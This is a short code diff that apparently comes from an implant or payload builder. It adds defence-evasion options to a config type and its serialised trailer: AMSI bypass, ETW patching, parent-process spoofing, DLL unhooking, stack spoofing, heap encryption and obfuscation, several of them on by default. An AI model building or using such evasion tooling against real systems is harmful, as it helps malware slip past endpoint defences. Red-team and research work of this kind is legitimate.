@@ -17,6 +17,13 @@ export type WrapConfig = {
   HideConsole?: boolean
   SleepInterval?: number
   Jitter?: number
+  AmsiBypass?: boolean
+  EtwPatch?: boolean
+  PpidSpoof?: boolean
+  DllUnhook?: boolean
+  HeapEncrypt?: boolean
+  StackSpoof?: boolean
+  Obfuscation?: boolean
 }
 
 function esc(s: string): string {
@@ -39,7 +46,11 @@ export function marshalTrailer(cfg: WrapConfig): Uint8Array {
     `"sleep_interval":${esc(sleep)},"jitter":${esc(jit)},"persistence":${esc(tf(cfg.Persistence, false))},` +
     `"hide_console":${esc(tf(cfg.HideConsole, true))},"key":${esc(key)},"injection_method":${esc(inj)},` +
     `"anti_debug":${esc(tf(cfg.AntiDebug, false))},"anti_vm":${esc(tf(cfg.AntiVM, false))},` +
-    `"sleep_obfuscation":${esc(tf(cfg.SleepObfuscation, false))}}`
+    `"sleep_obfuscation":${esc(tf(cfg.SleepObfuscation, false))},` +
+    `"amsi_bypass":${esc(tf(cfg.AmsiBypass, true))},"etw_patch":${esc(tf(cfg.EtwPatch, true))},` +
+    `"ppid_spoof":${esc(tf(cfg.PpidSpoof, false))},"dll_unhook":${esc(tf(cfg.DllUnhook, false))},` +
+    `"heap_encrypt":${esc(tf(cfg.HeapEncrypt, false))},"stack_spoof":${esc(tf(cfg.StackSpoof, false))},` +
+    `"obfuscation":${esc(tf(cfg.Obfuscation, true))}}`
   return new TextEncoder().encode(json)
 }
 
